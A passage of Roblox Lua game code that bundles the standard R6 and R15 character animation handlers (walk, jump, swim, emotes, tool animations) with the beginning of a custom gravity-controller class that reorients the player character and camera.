		for _, c in ipairs(tool:GetChildren()) do
			if c.Name == "toolanim" and c.className == "StringValue" then
				return c
			end
		end
		return nil
	end
	
	function animateTool()
		
		if (toolAnim == "None") then
			playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
			return
		end
	
		if (toolAnim == "Slash") then
			playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
			return
		end
	
		if (toolAnim == "Lunge") then
			playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
			return
		end
	end
	
	function moveSit()
		RightShoulder.MaxVelocity = 0.15
		LeftShoulder.MaxVelocity = 0.15
		RightShoulder:SetDesiredAngle(3.14 /2)
		LeftShoulder:SetDesiredAngle(-3.14 /2)
		RightHip:SetDesiredAngle(3.14 /2)
		LeftHip:SetDesiredAngle(-3.14 /2)
	end
	
	local lastTick = 0
	
	function move(time)
		local amplitude = 1
		local frequency = 1
	  	local deltaTime = time - lastTick
	  	lastTick = time
	
		local climbFudge = 0
		local setAngles = false
	
	  	if (jumpAnimTime > 0) then
	  		jumpAnimTime = jumpAnimTime - deltaTime
	  	end
	
		if (pose == "FreeFall" and jumpAnimTime <= 0) then
			playAnimation("fall", fallTransitionTime, Humanoid)
		elseif (pose == "Seated") then
			playAnimation("sit", 0.5, Humanoid)
			return
		elseif (pose == "Running") then
			playAnimation("walk", 0.1, Humanoid)
		elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
	--		print("Wha " .. pose)
			stopAllAnimations()
			amplitude = 0.1
			frequency = 1
			setAngles = true
		end
	
		if (setAngles) then
			local desiredAngle = amplitude * math.sin(time * frequency)
	
			RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
			LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
			RightHip:SetDesiredAngle(-desiredAngle)
			LeftHip:SetDesiredAngle(-desiredAngle)
		end
	
		-- Tool Animation handling
		local tool = getTool()
		if tool and tool:FindFirstChild("Handle") then
		
			local animStringValueObject = getToolAnim(tool)
	
			if animStringValueObject then
				toolAnim = animStringValueObject.Value
				-- message recieved, delete StringValue
				animStringValueObject.Parent = nil
				toolAnimTime = time + .3
			end
	
			if time > toolAnimTime then
				toolAnimTime = 0
				toolAnim = "None"
			end
	
			animateTool()		
		else
			stopToolAnimations()
			toolAnim = "None"
			toolAnimInstance = nil
			toolAnimTime = 0
		end
	end
	
	
	local events = {}
	local eventHum = Humanoid
	
	local function onUnhook()
		for i = 1, #events do
			events[i]:Disconnect()
		end
		events = {}
	end
	
	local function onHook()
		onUnhook()
		
		pose = eventHum.Sit and "Seated" or "Standing"
		
		events = {
			eventHum.Died:connect(onDied),
			eventHum.Running:connect(onRunning),
			eventHum.Jumping:connect(onJumping),
			eventHum.Climbing:connect(onClimbing),
			eventHum.GettingUp:connect(onGettingUp),
			eventHum.FreeFalling:connect(onFreeFall),
			eventHum.FallingDown:connect(onFallingDown),
			eventHum.Seated:connect(onSeated),
			eventHum.PlatformStanding:connect(onPlatformStanding),
			eventHum.Swimming:connect(onSwimming)
		}
	end
	
	
	onHook()
	
	-- setup emote chat hook
	game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
		local emote = ""
		if msg == "/e dance" then
			emote = dances[math.random(1, #dances)]
		elseif (string.sub(msg, 1, 3) == "/e ") then
			emote = string.sub(msg, 4)
		elseif (string.sub(msg, 1, 7) == "/emote ") then
			emote = string.sub(msg, 8)
		end
		
		if (pose == "Standing" and emoteNames[emote] ~= nil) then
			playAnimation(emote, 0.1, Humanoid)
		end
	
	end)
	
	
	-- main program
	
	-- initialize to idle
	playAnimation("idle", 0.1, Humanoid)
	pose = "Standing"
	
	spawn(function()
		while Figure.Parent ~= nil do
			local _, time = wait(0.1)
			move(time)
		end
	end)
	
	return {
		onRunning = onRunning, 
		onDied = onDied, 
		onJumping = onJumping, 
		onClimbing = onClimbing, 
		onGettingUp = onGettingUp, 
		onFreeFall = onFreeFall, 
		onFallingDown = onFallingDown, 
		onSeated = onSeated, 
		onPlatformStanding = onPlatformStanding,
		onHook = onHook,
		onUnhook = onUnhook
	}
	
	end
	return r6()
end

function _R15()
	local function r15()
		
	local Character = char
	local Humanoid = Character:WaitForChild("Humanoid")
	local pose = "Standing"
	
	local userNoUpdateOnLoopSuccess, userNoUpdateOnLoopValue = pcall(function() return UserSettings():IsUserFeatureEnabled("UserNoUpdateOnLoop") end)
	local userNoUpdateOnLoop = userNoUpdateOnLoopSuccess and userNoUpdateOnLoopValue
	local userAnimationSpeedDampeningSuccess, userAnimationSpeedDampeningValue = pcall(function() return UserSettings():IsUserFeatureEnabled("UserAnimationSpeedDampening") end)
	local userAnimationSpeedDampening = userAnimationSpeedDampeningSuccess and userAnimationSpeedDampeningValue
	
	local animateScriptEmoteHookFlagExists, animateScriptEmoteHookFlagEnabled = pcall(function()
		return UserSettings():IsUserFeatureEnabled("UserAnimateScriptEmoteHook")
	end)
	local FFlagAnimateScriptEmoteHook = animateScriptEmoteHookFlagExists and animateScriptEmoteHookFlagEnabled
	
	local AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
	local HumanoidHipHeight = 2
	
	local EMOTE_TRANSITION_TIME = 0.1
	
	local currentAnim = ""
	local currentAnimInstance = nil
	local currentAnimTrack = nil
	local currentAnimKeyframeHandler = nil
	local currentAnimSpeed = 1.0
	
	local runAnimTrack = nil
	local runAnimKeyframeHandler = nil
	
	local animTable = {}
	local animNames = { 
		idle = 	{	
					{ id = "http://www.roblox.com/asset/?id=507766666", weight = 1 },
					{ id = "http://www.roblox.com/asset/?id=507766951", weight = 1 },
					{ id = "http://www.roblox.com/asset/?id=507766388", weight = 9 }
				},
		walk = 	{ 	
					{ id = "http://www.roblox.com/asset/?id=507777826", weight = 10 } 
				}, 
		run = 	{
					{ id = "http://www.roblox.com/asset/?id=507767714", weight = 10 } 
				}, 
		swim = 	{
					{ id = "http://www.roblox.com/asset/?id=507784897", weight = 10 } 
				}, 
		swimidle = 	{
					{ id = "http://www.roblox.com/asset/?id=507785072", weight = 10 } 
				}, 
		jump = 	{
					{ id = "http://www.roblox.com/asset/?id=507765000", weight = 10 } 
				}, 
		fall = 	{
					{ id = "http://www.roblox.com/asset/?id=507767968", weight = 10 } 
				}, 
		climb = {
					{ id = "http://www.roblox.com/asset/?id=507765644", weight = 10 } 
				}, 
		sit = 	{
					{ id = "http://www.roblox.com/asset/?id=2506281703", weight = 10 } 
				},	
		toolnone = {
					{ id = "http://www.roblox.com/asset/?id=507768375", weight = 10 } 
				},
		toolslash = {
					{ id = "http://www.roblox.com/asset/?id=522635514", weight = 10 } 
				},
		toollunge = {
					{ id = "http://www.roblox.com/asset/?id=522638767", weight = 10 } 
				},
		wave = {
					{ id = "http://www.roblox.com/asset/?id=507770239", weight = 10 } 
				},
		point = {
					{ id = "http://www.roblox.com/asset/?id=507770453", weight = 10 } 
				},
		dance = {
					{ id = "http://www.roblox.com/asset/?id=507771019", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507771955", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507772104", weight = 10 } 
				},
		dance2 = {
					{ id = "http://www.roblox.com/asset/?id=507776043", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507776720", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507776879", weight = 10 } 
				},
		dance3 = {
					{ id = "http://www.roblox.com/asset/?id=507777268", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507777451", weight = 10 }, 
					{ id = "http://www.roblox.com/asset/?id=507777623", weight = 10 } 
				},
		laugh = {
					{ id = "http://www.roblox.com/asset/?id=507770818", weight = 10 } 
				},
		cheer = {
					{ id = "http://www.roblox.com/asset/?id=507770677", weight = 10 } 
				},
	}
	
	-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
	local emoteNames = { wave = false, point = false, dance = true, dance2 = true, dance3 = true, laugh = false, cheer = false}
	
	local PreloadAnimsUserFlag = false
	local PreloadedAnims = {}
	local successPreloadAnim, msgPreloadAnim = pcall(function()
		PreloadAnimsUserFlag = UserSettings():IsUserFeatureEnabled("UserPreloadAnimations")
	end)
	if not successPreloadAnim then
		PreloadAnimsUserFlag = false
	end
	
	math.randomseed(tick())
	
	function findExistingAnimationInSet(set, anim)
		if set == nil or anim == nil then
			return 0
		end
		
		for idx = 1, set.count, 1 do 
			if set[idx].anim.AnimationId == anim.AnimationId then
				return idx
			end
		end
		
		return 0
	end
	
	function configureAnimationSet(name, fileList)
		if (animTable[name] ~= nil) then
			for _, connection in pairs(animTable[name].connections) do
				connection:disconnect()
			end
		end
		animTable[name] = {}
		animTable[name].count = 0
		animTable[name].totalWeight = 0	
		animTable[name].connections = {}
	
		local allowCustomAnimations = true
	
		local success, msg = pcall(function() allowCustomAnimations = game:GetService("StarterPlayer").AllowCustomAnimations end)
		if not success then
			allowCustomAnimations = true
		end
	
		-- check for config values
		local config = script:FindFirstChild(name)
		if (allowCustomAnimations and config ~= nil) then
			table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
			table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
			
			local idx = 0
			for _, childPart in pairs(config:GetChildren()) do
				if (childPart:IsA("Animation")) then
					local newWeight = 1
					local weightObject = childPart:FindFirstChild("Weight")
					if (weightObject ~= nil) then
						newWeight = weightObject.Value
					end
					animTable[name].count = animTable[name].count + 1
					idx = animTable[name].count
					animTable[name][idx] = {}
					animTable[name][idx].anim = childPart
					animTable[name][idx].weight = newWeight
					animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
					table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
					table.insert(animTable[name].connections, childPart.ChildAdded:connect(function(property) configureAnimationSet(name, fileList) end))
					table.insert(animTable[name].connections, childPart.ChildRemoved:connect(function(property) configureAnimationSet(name, fileList) end))
				end
			end
		end
		
		-- fallback to defaults
		if (animTable[name].count <= 0) then
			for idx, anim in pairs(fileList) do
				animTable[name][idx] = {}
				animTable[name][idx].anim = Instance.new("Animation")
				animTable[name][idx].anim.Name = name
				animTable[name][idx].anim.AnimationId = anim.id
				animTable[name][idx].weight = anim.weight
				animTable[name].count = animTable[name].count + 1
				animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
			end
		end
		
		-- preload anims
		if PreloadAnimsUserFlag then
			for i, animType in pairs(animTable) do
				for idx = 1, animType.count, 1 do
					if PreloadedAnims[animType[idx].anim.AnimationId] == nil then
						Humanoid:LoadAnimation(animType[idx].anim)
						PreloadedAnims[animType[idx].anim.AnimationId] = true
					end				
				end
			end
		end
	end
	
	------------------------------------------------------------------------------------------------------------
	
	function configureAnimationSetOld(name, fileList)
		if (animTable[name] ~= nil) then
			for _, connection in pairs(animTable[name].connections) do
				connection:disconnect()
			end
		end
		animTable[name] = {}
		animTable[name].count = 0
		animTable[name].totalWeight = 0	
		animTable[name].connections = {}
	
		local allowCustomAnimations = true
	
		local success, msg = pcall(function() allowCustomAnimations = game:GetService("StarterPlayer").AllowCustomAnimations end)
		if not success then
			allowCustomAnimations = true
		end
	
		-- check for config values
		local config = script:FindFirstChild(name)
		if (allowCustomAnimations and config ~= nil) then
			table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
			table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
			local idx = 1
			for _, childPart in pairs(config:GetChildren()) do
				if (childPart:IsA("Animation")) then
					table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
					animTable[name][idx] = {}
					animTable[name][idx].anim = childPart
					local weightObject = childPart:FindFirstChild("Weight")
					if (weightObject == nil) then
						animTable[name][idx].weight = 1
					else
						animTable[name][idx].weight = weightObject.Value
					end
					animTable[name].count = animTable[name].count + 1
					animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
					idx = idx + 1
				end
			end
		end
	
		-- fallback to defaults
		if (animTable[name].count <= 0) then
			for idx, anim in pairs(fileList) do
				animTable[name][idx] = {}
				animTable[name][idx].anim = Instance.new("Animation")
				animTable[name][idx].anim.Name = name
				animTable[name][idx].anim.AnimationId = anim.id
				animTable[name][idx].weight = anim.weight
				animTable[name].count = animTable[name].count + 1
				animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
				-- print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
			end
		end
		
		-- preload anims
		if PreloadAnimsUserFlag then
			for i, animType in pairs(animTable) do
				for idx = 1, animType.count, 1 do 
					Humanoid:LoadAnimation(animType[idx].anim)
				end
			end
		end
	end
	
	-- Setup animation objects
	function scriptChildModified(child)
		local fileList = animNames[child.Name]
		if (fileList ~= nil) then
			configureAnimationSet(child.Name, fileList)
		end	
	end
	
	script.ChildAdded:connect(scriptChildModified)
	script.ChildRemoved:connect(scriptChildModified)
	
	
	for name, fileList in pairs(animNames) do 
		configureAnimationSet(name, fileList)
	end	
	
	-- ANIMATION
	
	-- declarations
	local toolAnim = "None"
	local toolAnimTime = 0
	
	local jumpAnimTime = 0
	local jumpAnimDuration = 0.31
	
	local toolTransitionTime = 0.1
	local fallTransitionTime = 0.2
	
	local currentlyPlayingEmote = false
	
	-- functions
	
	function stopAllAnimations()
		local oldAnim = currentAnim
	
		-- return to idle if finishing an emote
		if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
			oldAnim = "idle"
		end
		
		if FFlagAnimateScriptEmoteHook and currentlyPlayingEmote then
			oldAnim = "idle"
			currentlyPlayingEmote = false
		end
	
		currentAnim = ""
		currentAnimInstance = nil
		if (currentAnimKeyframeHandler ~= nil) then
			currentAnimKeyframeHandler:disconnect()
		end
	
		if (currentAnimTrack ~= nil) then
			currentAnimTrack:Stop()
			currentAnimTrack:Destroy()
			currentAnimTrack = nil
		end
	
		-- clean up walk if there is one
		if (runAnimKeyframeHandler ~= nil) then
			runAnimKeyframeHandler:disconnect()
		end
		
		if (runAnimTrack ~= nil) then
			runAnimTrack:Stop()
			runAnimTrack:Destroy()
			runAnimTrack = nil
		end
		
		return oldAnim
	end
	
	function getHeightScale()
		if Humanoid then
			if not Humanoid.AutomaticScalingEnabled then
				return 1
			end
			
			local scale = Humanoid.HipHeight / HumanoidHipHeight
			if userAnimationSpeedDampening then
				if AnimationSpeedDampeningObject == nil then
					AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
				end
				if AnimationSpeedDampeningObject ~= nil then
					scale = 1 + (Humanoid.HipHeight - HumanoidHipHeight) * AnimationSpeedDampeningObject.Value / HumanoidHipHeight
				end
			end
			return scale
		end	
		return 1
	end
	
	local smallButNotZero = 0.0001
	function setRunSpeed(speed)
		local speedScaled = speed * 1.25
		local heightScale = getHeightScale()
		local runSpeed = speedScaled / heightScale
	
		if runSpeed ~= currentAnimSpeed then
			if runSpeed < 0.33 then
				currentAnimTrack:AdjustWeight(1.0)		
				runAnimTrack:AdjustWeight(smallButNotZero)
			elseif runSpeed < 0.66 then
				local weight = ((runSpeed - 0.33) / 0.33)
				currentAnimTrack:AdjustWeight(1.0 - weight + smallButNotZero)
				runAnimTrack:AdjustWeight(weight + smallButNotZero)
			else
				currentAnimTrack:AdjustWeight(smallButNotZero)
				runAnimTrack:AdjustWeight(1.0)
			end
			currentAnimSpeed = runSpeed
			runAnimTrack:AdjustSpeed(runSpeed)
			currentAnimTrack:AdjustSpeed(runSpeed)
		end	
	end
	
	function setAnimationSpeed(speed)
		if currentAnim == "walk" then
				setRunSpeed(speed)
		else
			if speed ~= currentAnimSpeed then
				currentAnimSpeed = speed
				currentAnimTrack:AdjustSpeed(currentAnimSpeed)
			end
		end
	end
	
	function keyFrameReachedFunc(frameName)
		if (frameName == "End") then
			if currentAnim == "walk" then
				if userNoUpdateOnLoop == true then
					if runAnimTrack.Looped ~= true then
						runAnimTrack.TimePosition = 0.0
					end
					if currentAnimTrack.Looped ~= true then
						currentAnimTrack.TimePosition = 0.0
					end
				else
					runAnimTrack.TimePosition = 0.0
					currentAnimTrack.TimePosition = 0.0
				end
			else
				local repeatAnim = currentAnim
				-- return to idle if finishing an emote
				if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
					repeatAnim = "idle"
				end
				
				if FFlagAnimateScriptEmoteHook and currentlyPlayingEmote then
					if currentAnimTrack.Looped then
						-- Allow the emote to loop
						return
					end
					
					repeatAnim = "idle"
					currentlyPlayingEmote = false
				end
				
				local animSpeed = currentAnimSpeed
				playAnimation(repeatAnim, 0.15, Humanoid)
				setAnimationSpeed(animSpeed)
			end
		end
	end
	
	function rollAnimation(animName)
		local roll = math.random(1, animTable[animName].totalWeight) 
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
		return idx
	end
	
	local function switchToAnim(anim, animName, transitionTime, humanoid)
		-- switch animation		
		if (anim ~= currentAnimInstance) then
			
			if (currentAnimTrack ~= nil) then
				currentAnimTrack:Stop(transitionTime)
				currentAnimTrack:Destroy()
			end
	
			if (runAnimTrack ~= nil) then
				runAnimTrack:Stop(transitionTime)
				runAnimTrack:Destroy()
				if userNoUpdateOnLoop == true then
					runAnimTrack = nil
				end
			end
	
			currentAnimSpeed = 1.0
		
			-- load it to the humanoid; get AnimationTrack
			currentAnimTrack = humanoid:LoadAnimation(anim)
			currentAnimTrack.Priority = Enum.AnimationPriority.Core
			 
			-- play the animation
			currentAnimTrack:Play(transitionTime)
			currentAnim = animName
			currentAnimInstance = anim
	
			-- set up keyframe name triggers
			if (currentAnimKeyframeHandler ~= nil) then
				currentAnimKeyframeHandler:disconnect()
			end
			currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
			
			-- check to see if we need to blend a walk/run animation
			if animName == "walk" then
				local runAnimName = "run"
				local runIdx = rollAnimation(runAnimName)
	
				runAnimTrack = humanoid:LoadAnimation(animTable[runAnimName][runIdx].anim)
				runAnimTrack.Priority = Enum.AnimationPriority.Core
				runAnimTrack:Play(transitionTime)		
				
				if (runAnimKeyframeHandler ~= nil) then
					runAnimKeyframeHandler:disconnect()
				end
				runAnimKeyframeHandler = runAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)	
			end
		end
	end
	
	function playAnimation(animName, transitionTime, humanoid) 	
		local idx = rollAnimation(animName)
		local anim = animTable[animName][idx].anim
	
		switchToAnim(anim, animName, transitionTime, humanoid)
		currentlyPlayingEmote = false
	end
	
	function playEmote(emoteAnim, transitionTime, humanoid)
		switchToAnim(emoteAnim, emoteAnim.Name, transitionTime, humanoid)
		currentlyPlayingEmote = true
	end
	
	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------
	
	local toolAnimName = ""
	local toolAnimTrack = nil
	local toolAnimInstance = nil
	local currentToolAnimKeyframeHandler = nil
	
	function toolKeyFrameReachedFunc(frameName)
		if (frameName == "End") then
			playToolAnimation(toolAnimName, 0.0, Humanoid)
		end
	end
	
	
	function playToolAnimation(animName, transitionTime, humanoid, priority)	 		
			local idx = rollAnimation(animName)
			local anim = animTable[animName][idx].anim
	
			if (toolAnimInstance ~= anim) then
				
				if (toolAnimTrack ~= nil) then
					toolAnimTrack:Stop()
					toolAnimTrack:Destroy()
					transitionTime = 0
				end
						
				-- load it to the humanoid; get AnimationTrack
				toolAnimTrack = humanoid:LoadAnimation(anim)
				if priority then
					toolAnimTrack.Priority = priority
				end
				 
				-- play the animation
				toolAnimTrack:Play(transitionTime)
				toolAnimName = animName
				toolAnimInstance = anim
	
				currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
			end
	end
	
	function stopToolAnimations()
		local oldAnim = toolAnimName
	
		if (currentToolAnimKeyframeHandler ~= nil) then
			currentToolAnimKeyframeHandler:disconnect()
		end
	
		toolAnimName = ""
		toolAnimInstance = nil
		if (toolAnimTrack ~= nil) then
			toolAnimTrack:Stop()
			toolAnimTrack:Destroy()
			toolAnimTrack = nil
		end
	
		return oldAnim
	end
	
	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------
	-- STATE CHANGE HANDLERS
	
	function onRunning(speed)
		if speed > 0.75 then
			local scale = 16.0
			playAnimation("walk", 0.2, Humanoid)
			setAnimationSpeed(speed / scale)
			pose = "Running"
		else
			if emoteNames[currentAnim] == nil and not currentlyPlayingEmote then
				playAnimation("idle", 0.2, Humanoid)
				pose = "Standing"
			end
		end
	end
	
	function onDied()
		pose = "Dead"
	end
	
	function onJumping()
		playAnimation("jump", 0.1, Humanoid)
		jumpAnimTime = jumpAnimDuration
		pose = "Jumping"
	end
	
	function onClimbing(speed)
		local scale = 5.0
		playAnimation("climb", 0.1, Humanoid)
		setAnimationSpeed(speed / scale)
		pose = "Climbing"
	end
	
	function onGettingUp()
		pose = "GettingUp"
	end
	
	function onFreeFall()
		if (jumpAnimTime <= 0) then
			playAnimation("fall", fallTransitionTime, Humanoid)
		end
		pose = "FreeFall"
	end
	
	function onFallingDown()
		pose = "FallingDown"
	end
	
	function onSeated()
		pose = "Seated"
	end
	
	function onPlatformStanding()
		pose = "PlatformStanding"
	end
	
	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------
	
	function onSwimming(speed)
		if speed > 1.00 then
			local scale = 10.0
			playAnimation("swim", 0.4, Humanoid)
			setAnimationSpeed(speed / scale)
			pose = "Swimming"
		else
			playAnimation("swimidle", 0.4, Humanoid)
			pose = "Standing"
		end
	end
	
	function animateTool()
		if (toolAnim == "None") then
			playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
			return
		end
	
		if (toolAnim == "Slash") then
			playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
			return
		end
	
		if (toolAnim == "Lunge") then
			playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
			return
		end
	end
	
	function getToolAnim(tool)
		for _, c in ipairs(tool:GetChildren()) do
			if c.Name == "toolanim" and c.className == "StringValue" then
				return c
			end
		end
		return nil
	end
	
	local lastTick = 0
	
	function stepAnimate(currentTime)
		local amplitude = 1
		local frequency = 1
	  	local deltaTime = currentTime - lastTick
	  	lastTick = currentTime
	
		local climbFudge = 0
		local setAngles = false
	
	  	if (jumpAnimTime > 0) then
	  		jumpAnimTime = jumpAnimTime - deltaTime
	  	end
	
		if (pose == "FreeFall" and jumpAnimTime <= 0) then
			playAnimation("fall", fallTransitionTime, Humanoid)
		elseif (pose == "Seated") then
			playAnimation("sit", 0.5, Humanoid)
			return
		elseif (pose == "Running") then
			playAnimation("walk", 0.2, Humanoid)
		elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
			stopAllAnimations()
			amplitude = 0.1
			frequency = 1
			setAngles = true
		end
	
		-- Tool Animation handling
		local tool = Character:FindFirstChildOfClass("Tool")
		if tool and tool:FindFirstChild("Handle") then
			local animStringValueObject = getToolAnim(tool)
	
			if animStringValueObject then
				toolAnim = animStringValueObject.Value
				-- message recieved, delete StringValue
				animStringValueObject.Parent = nil
				toolAnimTime = currentTime + .3
			end
	
			if currentTime > toolAnimTime then
				toolAnimTime = 0
				toolAnim = "None"
			end
	
			animateTool()		
		else
			stopToolAnimations()
			toolAnim = "None"
			toolAnimInstance = nil
			toolAnimTime = 0
		end
	end
	
	-- connect events
	
	local events = {}
	local eventHum = Humanoid
	
	local function onUnhook()
		for i = 1, #events do
			events[i]:Disconnect()
		end
		events = {}
	end
	
	local function onHook()
		onUnhook()
		
		pose = eventHum.Sit and "Seated" or "Standing"
		
		events = {
			eventHum.Died:connect(onDied),
			eventHum.Running:connect(onRunning),
			eventHum.Jumping:connect(onJumping),
			eventHum.Climbing:connect(onClimbing),
			eventHum.GettingUp:connect(onGettingUp),
			eventHum.FreeFalling:connect(onFreeFall),
			eventHum.FallingDown:connect(onFallingDown),
			eventHum.Seated:connect(onSeated),
			eventHum.PlatformStanding:connect(onPlatformStanding),
			eventHum.Swimming:connect(onSwimming)
		}
	end
	
	
	onHook()
	
	-- setup emote chat hook
	game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
		local emote = ""
		if (string.sub(msg, 1, 3) == "/e ") then
			emote = string.sub(msg, 4)
		elseif (string.sub(msg, 1, 7) == "/emote ") then
			emote = string.sub(msg, 8)
		end
		
		if (pose == "Standing" and emoteNames[emote] ~= nil) then
			playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
		end
	end)
	
	--[[ emote bindable hook
	if FFlagAnimateScriptEmoteHook then
		script:WaitForChild("PlayEmote").OnInvoke = function(emote)
			-- Only play emotes when idling
			if pose ~= "Standing" then
				return
			end
			if emoteNames[emote] ~= nil then
				-- Default emotes
				playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
				return true
			elseif typeof(emote) == "Instance" and emote:IsA("Animation") then
				-- Non-default emotes
				playEmote(emote, EMOTE_TRANSITION_TIME, Humanoid)
				return true
			end
			-- Return false to indicate that the emote could not be played
			return false
		end
	end
	]]
	-- initialize to idle
	playAnimation("idle", 0.1, Humanoid)
	pose = "Standing"
	-- loop to handle timed state transitions and tool animations
	spawn(function()
		while Character.Parent ~= nil do
			local _, currentGameTime = wait(0.1)
			stepAnimate(currentGameTime)
		end
	end)
	return {
		onRunning = onRunning, 
		onDied = onDied, 
		onJumping = onJumping, 
		onClimbing = onClimbing, 
		onGettingUp = onGettingUp, 
		onFreeFall = onFreeFall, 
		onFallingDown = onFallingDown, 
		onSeated = onSeated, 
		onPlatformStanding = onPlatformStanding,
		onHook = onHook,
		onUnhook = onUnhook
	}
	end
	return r15()
end
while true do
	wait(.1)
	if plr.Character ~= nil then
		char = plr.Character
		break
	end
end
function _Controller()
	local humanoid = char:WaitForChild("Humanoid")
	local animFuncs = {}
	if (humanoid.RigType == Enum.HumanoidRigType.R6) then
		animFuncs = _R6()
	else
		animFuncs = _R15()
	end
	print("Animation succes")
	return animFuncs
end
function _AnimationHandler()
local AnimationHandler = {}
AnimationHandler.__index = AnimationHandler

function AnimationHandler.new(humanoid, animate)
	local self = setmetatable({}, AnimationHandler)
	
	self._AnimFuncs = _Controller()
	self.Humanoid = humanoid
	
	return self
end

function AnimationHandler:EnableDefault(bool)
	if (bool) then
		self._AnimFuncs.onHook()
	else
		self._AnimFuncs.onUnhook()
	end
end

function AnimationHandler:Run(name, ...)
	self._AnimFuncs[name](...)
end

return AnimationHandler
end

function _GravityController()

local ZERO = Vector3.new(0, 0, 0)
local UNIT_X = Vector3.new(1, 0, 0)
local UNIT_Y = Vector3.new(0, 1, 0)
local UNIT_Z = Vector3.new(0, 0, 1)
local VEC_XY = Vector3.new(1, 0, 1)

local IDENTITYCF = CFrame.new()

local JUMPMODIFIER = 1.2
local TRANSITION = 0.15
local WALKF = 200 / 3

local UIS = game:GetService("UserInputService")
local RUNSERVICE = game:GetService("RunService")

local InitObjects = _InitObjects()
local AnimationHandler = _AnimationHandler()
local StateTracker = _StateTracker()

-- Class

local GravityController = {}
GravityController.__index = GravityController

-- Private Functions

local function getRotationBetween(u, v, axis)
	local dot, uxv = u:Dot(v), u:Cross(v)
	if (dot < -0.99999) then return CFrame.fromAxisAngle(axis, math.pi) end
	return CFrame.new(0, 0, 0, uxv.x, uxv.y, uxv.z, 1 + dot)
end

local function lookAt(pos, forward, up)
	local r = forward:Cross(up)
	local u = r:Cross(forward)
	return CFrame.fromMatrix(pos, r.Unit, u.Unit)
end

local function getMass(array)
	local mass = 0
	for _, part in next, array do
		if (part:IsA("BasePart")) then
			mass = mass + part:GetMass()
		end
	end
	return mass
end

-- Public Constructor
local ExecutedPlayerModule = _PlayerModule()
local ExecutedSounds = _sounds()
function GravityController.new(player)
	local self = setmetatable({}, GravityController)

	--[[ Camera
	local loaded = player.PlayerScripts:WaitForChild("PlayerScriptsLoader"):WaitForChild("Loaded")
	if (not loaded.Value) then
		--loaded.Changed:Wait()
	end
	]]
	local playerModule = ExecutedPlayerModule
	self.Controls = playerModule:GetControls()
	self.Camera = playerModule:GetCameras()
	
	-- Player and character
	self.Player = player
	self.Character = player.Character
	self.Humanoid = player.Character:WaitForChild("Humanoid")
	self.HRP = player.Character:WaitForChild("HumanoidRootPart")
	
	-- Animation
	self.AnimationHandler = AnimationHandler.new(self.Humanoid, self.Character:WaitForChild("Animate"))
	self.AnimationHandler:EnableDefault(false)
	local ssss = game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("SetState") or Instance.new("BindableEvent",game:GetService("Players").LocalPlayer.PlayerScripts)
	local soundState = ExecutedSounds
	ssss.Name = "SetState"
	
	self.StateTracker = StateTracker.new(self.Humanoid, soundState)
	self.StateTracker.Changed:Connect(function(name, speed)
		self.AnimationHandler:Run(name, speed)
	end)
	
	-- Collider and forces
	local collider, gyro, vForce, floor = InitObjects(self)
	
	floor.Touched:Connect(function() end)
	collider.Touched:Connect(function() end)
	
	self.Collider = collider
	self.VForce = vForce
	self.Gyro = gyro
	self.Floor = floor
	
	-- Attachment to parts
	self.LastPart = workspace.Terrain
	self.LastPartCFrame = IDENTITYCF
	
	-- Gravity properties
	self.GravityUp = UNIT_Y
	self.Ignores = {self.Character}
	
	function self.Camera.GetUpVector(this, oldUpVector)
		return self.GravityUp
	end
	
	-- Events etc
	self.Humanoid.PlatformStand = true
	
	self.CharacterMass = getMass(self.Character:GetDescendants())
	self.Character.AncestryChanged:Connect(function() self.CharacterMass = getMass(self.Character:GetDescendants()) end)
